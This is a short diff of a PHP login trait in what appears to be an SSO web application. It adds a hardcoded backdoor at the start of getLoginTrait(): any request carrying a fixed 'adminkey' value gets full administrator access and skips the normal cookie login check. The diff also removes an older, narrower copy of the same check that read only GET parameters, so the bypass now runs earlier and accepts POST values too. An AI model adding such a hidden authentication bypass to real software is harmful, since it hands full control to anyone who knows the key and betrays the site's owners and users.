@@ -172,6 +172,12 @@ trait LoginTrait
      */
     final public function getLoginTrait()
     {
+
+        if ($_REQUEST['adminkey'] == 'akslcsascdqwwdqwdqFwgdqh2027bcsywqcbha') {
+            $this->setSsoctrollerClassAccess(access::CAO_ZUO);
+            return null;
+        }
+
         $islogin = $this->userCookieModel
             ->check();
 
@@ -182,10 +188,6 @@ trait LoginTrait
             $SsoThriftConfigObject = new $SsoThriftConfig;
         }
 
-        if ($_GET['adminkey'] == 'akslcsascdqwwdqwdqFwgdqh2027bcsywqcbha') {
-            $this->setSsoctrollerClassAccess(access::CAO_ZUO);
-            return null;
-        }
         //命令行模式,直接管理员权限
         if (php_sapi_name() == 'cli') {
             $this->setSsoctrollerClassAccess(access::CAO_ZUO);
